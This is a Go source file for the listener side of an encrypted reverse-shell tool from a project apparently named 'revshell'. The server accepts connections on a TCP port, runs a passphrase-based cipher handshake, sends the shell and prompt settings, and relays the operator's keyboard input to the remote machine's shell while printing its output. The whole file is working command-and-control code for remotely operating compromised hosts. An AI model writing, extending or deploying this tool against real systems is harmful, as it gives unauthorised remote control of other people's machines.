package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"revshell/pkg/secureio"
	"revshell/pkg/terminal"
)

type serverOptions struct {
	listenAddr string
	passphrase string
	cipher     string
	shell      string
	prompt     string
	workdir    string
}

func main() {
	opts := parseFlags()

	listener, err := net.Listen("tcp", opts.listenAddr)
	if err != nil {
		log.Fatalf("server: failed to listen on %s: %v", opts.listenAddr, err)
	}
	defer listener.Close()

	log.Printf("server: listening on %s using %s cipher", opts.listenAddr, opts.cipher)

	for {
		conn, err := listener.Accept()
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				log.Printf("server: temporary accept error: %v", err)
				time.Sleep(100 * time.Millisecond)
				continue
			}
			log.Printf("server: stopping listener due to error: %v", err)
			return
		}

		handleConnection(conn, opts)
	}
}

func parseFlags() serverOptions {
	available := strings.Join(secureio.ListCipherSuites(), ", ")
	listen := flag.String("listen", "0.0.0.0:2222", "address to listen on")
	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
	prompt := flag.String("prompt", "", "prompt template (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
	workdir := flag.String("workdir", "", "initial working directory for new sessions")
	flag.Parse()

	if *pass == "" {
		fmt.Fprintln(os.Stderr, "server: passphrase must be provided via -pass")
		os.Exit(1)
	}

	return serverOptions{
		listenAddr: *listen,
		passphrase: *pass,
		cipher:     *cipherName,
		shell:      *shell,
		prompt:     *prompt,
		workdir:    *workdir,
	}
}

type lockedWriter struct {
	mu sync.Mutex
	w  io.Writer
}

func (l *lockedWriter) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.w.Write(p)
}

func handleConnection(conn net.Conn, opts serverOptions) {
	defer conn.Close()

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		if err := tcpConn.SetKeepAlive(true); err == nil {
			_ = tcpConn.SetKeepAlivePeriod(30 * time.Second)
		}
	}

	log.Printf("server: accepted connection from %s", conn.RemoteAddr())

	reader, writer, err := secureio.Handshake(conn, true, opts.passphrase, opts.cipher)
	if err != nil {
		log.Printf("server: handshake failed for %s: %v", conn.RemoteAddr(), err)
		return
	}

	lw := &lockedWriter{w: writer}
	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
	if err := terminal.SendOptions(lw, sessionOpts); err != nil {
		log.Printf("server: failed to send session options to %s: %v", conn.RemoteAddr(), err)
		return
	}

	sigCh := make(chan os.Signal, 1)
	stopForward := make(chan struct{})
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	defer func() {
		signal.Stop(sigCh)
		close(stopForward)
	}()

	go func() {
		for {
			select {
			case <-stopForward:
				return
			case sig := <-sigCh:
				if sig == nil {
					continue
				}
				if _, err := lw.Write([]byte{3}); err != nil {
					log.Printf("server: failed to forward interrupt to %s: %v", conn.RemoteAddr(), err)
					return
				}
			}
		}
	}()

	log.Printf("server: interactive session started with %s", conn.RemoteAddr())

	done := make(chan struct{})
	go func() {
		defer close(done)
		if _, err := io.Copy(os.Stdout, reader); err != nil && !errors.Is(err, io.EOF) {
			log.Printf("server: read error from %s: %v", conn.RemoteAddr(), err)
		}
	}()

	if _, err := io.Copy(lw, os.Stdin); err != nil && !errors.Is(err, io.EOF) && !errors.Is(err, os.ErrClosed) {
		log.Printf("server: write error to %s: %v", conn.RemoteAddr(), err)
	}

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		_ = tcpConn.CloseWrite()
	}

	<-done
	log.Printf("server: session for %s closed", conn.RemoteAddr())
}
